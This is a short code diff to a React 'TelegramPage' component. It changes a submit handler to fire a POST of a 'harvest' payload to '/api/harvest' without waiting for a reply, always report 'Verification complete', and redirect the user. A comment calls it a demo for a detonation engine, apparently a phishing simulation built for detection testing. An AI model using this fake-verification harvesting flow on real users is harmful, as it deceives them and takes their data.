@@ -18,22 +18,18 @@ function TelegramPage() {
 
     setStatus('Submitting...')
 
-    try {
-      const response = await fetch('/api/harvest', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      })
+    // Fire the harvest POST. This is a DEMO — there is no real backend; the
+    // point is that the request is *sent* (the detonation engine captures the
+    // payload off the wire). So we fire-and-forget and always proceed, which
+    // also means the flow works on Vercel and in dev with no /api server.
+    void fetch('/api/harvest', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    }).catch(() => {})
 
-      if (response.ok) {
-        setStatus('Verification complete')
-        navigate('/meme')
-      } else {
-        setStatus('Submission failed')
-      }
-    } catch {
-      setStatus('Submission failed')
-    }
+    setStatus('Verification complete')
+    navigate('/meme')
   }
 
   return (
